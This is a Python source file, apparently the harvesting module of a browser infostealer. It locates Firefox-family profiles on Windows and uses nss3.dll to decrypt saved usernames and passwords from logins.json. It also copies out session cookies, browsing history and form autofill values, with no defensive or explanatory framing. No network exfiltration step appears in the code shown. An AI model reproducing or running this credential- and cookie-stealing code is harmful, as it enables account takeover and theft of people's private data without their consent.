import os
import shutil
import ctypes as ct
import json
import sqlite3
from contextlib import closing
from base64 import b64decode
AppData = os.environ["USERPROFILE"] + "\\AppData"

class c_char_p_fromstr(ct.c_char_p):
    def from_param(self):
        return self.encode("utf-8")

class NSSProxy:
    class SECItem(ct.Structure):
        _fields_ = [
            ('type', ct.c_uint),
            ('data', ct.c_char_p),
            ('len', ct.c_uint),
        ]

        def decode_data(self):
            return ct.string_at(self.data, self.len).decode("utf-8")

    def __init__(self, nss_path, profile):
        self.libnss = ct.CDLL(nss_path)

        self.setCtypes(ct.c_int, "NSS_Init", c_char_p_fromstr)
        self.setCtypes(ct.c_int, "NSS_Shutdown")
        sec = ct.POINTER(self.SECItem)
        self.setCtypes(ct.c_int, "PK11SDR_Decrypt", sec, sec, ct.c_void_p)

        self._NSS_Init("sql:" + profile)

    def setCtypes(self, restype, name, *argtypes):
        res = getattr(self.libnss, name)
        res.argtypes = argtypes
        res.restype = restype
        setattr(self, "_" + name, res)        

    def shutdown(self):
        self._NSS_Shutdown()

    def decrypt(self, data64):
        data = b64decode(data64)
        inp = self.SECItem(0, data, len(data))
        out = self.SECItem(0, None, 0)
        self._PK11SDR_Decrypt(inp, out, None)

        return out.decode_data()

def getCreds(profile_dir):
    with open(profile_dir + "\\logins.json") as file:
        f = file.read()
        credentials = json.loads(f)["logins"]

    return credentials

def getFoxes():
    paths = [
        "C:\\Program Files\\Mozilla Firefox",
        "C:\\Program Files\\SeaMonkey",
        "C:\\Program Files\\Waterfox",
        "C:\\Program Files (x86)\\Mozilla Firefox",
        "C:\\Program Files (x86)\\Mozilla Thunderbird",
        "C:\\Program Files (x86)\\Nightly",
        "C:\\Program Files (x86)\\SeaMonkey",
        "C:\\Program Files (x86)\\Waterfox"
    ]

    foxes = []
    for path in paths:
        if os.path.exists(path):
            foxes.append(path) 

    return foxes

def getProfiles():
    path = AppData + "\\Roaming\\Mozilla\\Firefox\\Profiles\\"

    profiles = []
    for d in os.listdir(path):
        if os.path.exists(path + d + "\\storage"):
            profiles.append({
                "name": d,
                "path": path + d,
                "has_cookies": os.path.exists(path + d + "\\cookies.sqlite"),
                "has_logins": os.path.exists(path + d + "\\logins.json"),
                "has_history": os.path.exists(path + d + "\\places.sqlite"),
                "has_form_history": os.path.exists(path + d + "\\formhistory.sqlite")
            })

    return profiles

def getLogindata(fox, profile):
    proxy = NSSProxy(fox + "\\nss3.dll", profile)

    logins = []
    for cred in getCreds(profile):
        logins.append({ 
            "id":  cred["id"],
            "url": cred["hostname"],
            "action": cred["formSubmitURL"],
            "created": cred["timeCreated"],
            "last_used": cred["timeLastUsed"],
            "used": cred["timesUsed"],
            "username": proxy.decrypt(cred["encryptedUsername"]),
            "password": proxy.decrypt(cred["encryptedPassword"]),
            "username_input": cred["usernameField"], 
            "password_input": cred["passwordField"]
        })

    proxy.shutdown()
    return logins

def getCookies(path):
    cookies = []
    if not os.path.exists(".\\temp"):
        os.mkdir(".\\temp");

    shutil.copyfile(path + "\\cookies.sqlite", ".\\temp\\cookies.sqlite");

    with closing(sqlite3.connect(".\\temp\\cookies.sqlite")) as con, con, closing(con.cursor()) as cur:
            con.text_factory = bytes
            cur.execute("SELECT name, value, host, path, expiry FROM moz_cookies")
            cookie_db = cur.fetchall()

    shutil.rmtree(".\\temp")

    for cd in cookie_db:
        cookies.append({
            "host": cd[2].decode("utf-8"),
            "path": cd[3].decode("utf-8"),
            "name": cd[0].decode("utf-8"),
            "value": cd[1].decode("utf-8"),
            "expires": cd[4]
        })

    return cookies

def getHistory(path):
    history = []
    
    if not os.path.exists(".\\temp"):
        os.mkdir(".\\temp");

    shutil.copyfile(path + "\\places.sqlite", ".\\temp\\places.sqlite");

    with closing(sqlite3.connect(".\\temp\\places.sqlite")) as con, con, closing(con.cursor()) as cur:
            con.text_factory = bytes
            cur.execute("SELECT id, title, url, last_visit_date FROM moz_places")
            history_db = cur.fetchall()

    shutil.rmtree(".\\temp")

    for hd in history_db:

        if hd[1] == None:
            title = ""
        else:
            title = hd[1].decode("utf-8")

        history.append({
            "id": hd[0],
            "title": title,
            "url": hd[2].decode("utf-8"),
            "visit_time": hd[3],
        })
    return history

def getFormHistory(path):
    fills = []
    if not os.path.exists(".\\temp"):
        os.mkdir(".\\temp");

    shutil.copyfile(path + "\\formhistory.sqlite", ".\\temp\\formhistory.sqlite");

    with closing(sqlite3.connect(".\\temp\\formhistory.sqlite")) as con, con, closing(con.cursor()) as cur:
            con.text_factory = bytes
            cur.execute("SELECT * FROM moz_formhistory")
            autofills = cur.fetchall()

    for fill in autofills:
        fills.append({
            "name": fill[1].decode("utf-8"),
            "value": fill[2].decode("utf-8"),
            "used": fill[3],
            "date_created": fill[4],
            "date_used": fill[5]
        })
        
    shutil.rmtree(".\\temp")
    return fills

def getAllData():
    if not os.path.exists(AppData + "\\Roaming\\Mozilla\\Firefox\\Profiles\\"):
        return []

    profiles = getProfiles()

    for fox in getFoxes():
        for profile in profiles:
            profile["logins"] = [] if not profile["has_logins"] else getLogindata(fox, profile["path"])
            profile["history"] = [] if not profile["has_history"] else getHistory(profile["path"])
            profile["cookies"] = [] if not profile["has_cookies"] else getCookies(profile["path"])
            profile["form_history"] = [] if not profile["has_form_history"] else getFormHistory(profile["path"])

    return profiles